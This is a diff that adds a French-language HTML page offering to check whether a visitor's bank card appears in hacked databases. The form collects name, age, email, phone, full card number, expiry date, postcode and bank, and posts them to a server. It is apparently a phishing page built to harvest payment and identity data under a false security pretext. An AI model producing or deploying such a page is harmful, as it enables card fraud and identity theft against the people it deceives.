@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sécurité des Cartes Bancaires</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #d7f3f3;
+        }
+
+        .container {
+            width: 80%;
+            max-width: 900px;
+            padding: 20px;
+            background-color: #cdeeee;
+            border: 2px solid #a2d7d7;
+            border-radius: 10px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        h1 {
+            font-size: 1.6em;
+            color: #333;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        p {
+            font-size: 1em;
+            color: #444;
+            text-align: center;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 50px;
+        }
+
+        label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        input[type="text"],
+        select {
+            width: 95%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 0.9em;
+        }
+
+        .full-width {
+            grid-column: span 2;
+        }
+
+        .scan-button {
+            width: 100%;
+            padding: 15px;
+            background-color: #f85353;
+            color: white;
+            font-weight: bold;
+            font-size: 1em;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .scan-button:hover {
+            background-color: #e12e2e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Votre numéro de carte bancaire figure-t-il dans une base de données piratée ?</h1>
+        <p>Découvrez-le dès maintenant ! Entrez simplement vos informations ci-dessous, et nous analyserons des milliers de bases de données piratées pour voir si elles correspondent à vos données.</p>
+        <form action="/submit" method="POST" class="form-grid">
+            <div>
+                <label for="prenom">Votre Prénom :</label>
+                <input type="text" id="prenom" name="prenom" placeholder="Entrez votre prénom" required>
+            </div>
+            <div>
+                <label for="age">Votre Âge :</label>
+                <input type="text" id="age" name="age" placeholder="Entrez votre âge" required>
+            </div>
+            <div>
+                <label for="email">Votre Adresse E-mail :</label>
+                <input type="text" id="email" name="email" placeholder="Entrez votre adresse e-mail" required>
+            </div>
+            <div>
+                <label for="telephone">Votre Téléphone :</label>
+                <input type="text" id="telephone" name="telephone" placeholder="Entrez votre numéro de téléphone" required>
+            </div>
+            <div>
+                <label for="cc-number">Numéro de Carte Bancaire :</label>
+                <input type="text" id="cc-number" name="cc-number" placeholder="Entrez votre numéro de carte bancaire" required>
+            </div>
+            <div>
+                <label for="exp-date">Date d'Expiration :</label>
+                <input type="text" id="exp-date" name="exp-date" placeholder="MM/YY" required>
+            </div>
+            <div>
+                <label for="zip-code">Votre Code Postal :</label>
+                <input type="text" id="zip-code" name="zip-code" placeholder="Entrez votre code postal" required>
+            </div>
+            <div>
+                <label for="banque">Votre Banque :</label>
+                <select id="banque" name="banque" required>
+                    <option value=""></option>
+                    <option value="Bnaque Populaire">Bnaque Populaire</option>
+                    <option value="NP Paribas">BNP Paribas</option>
+                    <option value="BPCE">BPCE</option>
+                    <option value="Caisse d'Epargne">Caisse d'Epargne</option>
+                    <option value="CIC">CIC</option>
+                    <option value="Crédit Agricole">Crédit Agricole</option>
+                    <option value="Crédit du Nord">Crédit du Nord</option>
+                    <option value="Crédit Mutuel">Crédit Mutuel</option>
+                    <option value="La banque Postale">La banque Postale</option>
+                    <option value="LCL">LCL</option>
+                    <option value="Société Générale">Société Générale</option>
+                </select>
+            </div>
+            <button type="submit" class="scan-button full-width">ANALYSER LA BASE DE DONNÉES</button>
+        </form>
+    </div>
+</body>
+</html>
